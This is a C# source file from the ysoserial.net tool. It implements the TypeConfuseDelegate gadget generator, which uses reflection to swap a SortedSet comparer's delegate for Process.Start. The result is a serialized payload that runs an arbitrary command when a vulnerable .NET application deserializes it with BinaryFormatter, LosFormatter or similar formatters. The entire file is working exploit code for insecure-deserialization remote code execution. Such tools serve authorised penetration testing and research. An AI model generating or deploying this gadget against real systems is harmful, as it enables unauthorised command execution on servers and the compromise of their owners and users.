﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class TypeConfuseDelegateGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TypeConfuseDelegate";
        }

        public override string Description()
        {
            return "TypeConfuseDelegate gadget";
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeNotDerived };
        }


        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
        }

        /* this can be used easily by the plugins as well */

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TypeConfuseDelegateGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TypeConfuseDelegateGadget(inputArgs);
        }

        public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
        {
            string cmdFromFile = inputArgs.CmdFromFile;

            if (!string.IsNullOrEmpty(cmdFromFile))
            {
                inputArgs.Cmd = cmdFromFile;
            }
            
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(inputArgs.CmdFileName);
            if (inputArgs.HasArguments)
            {
                set.Add(inputArgs.CmdArguments);
            }
            else
            {
                set.Add(""); // this is needed (as it accepts two args?)
            }
            
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }

    }
}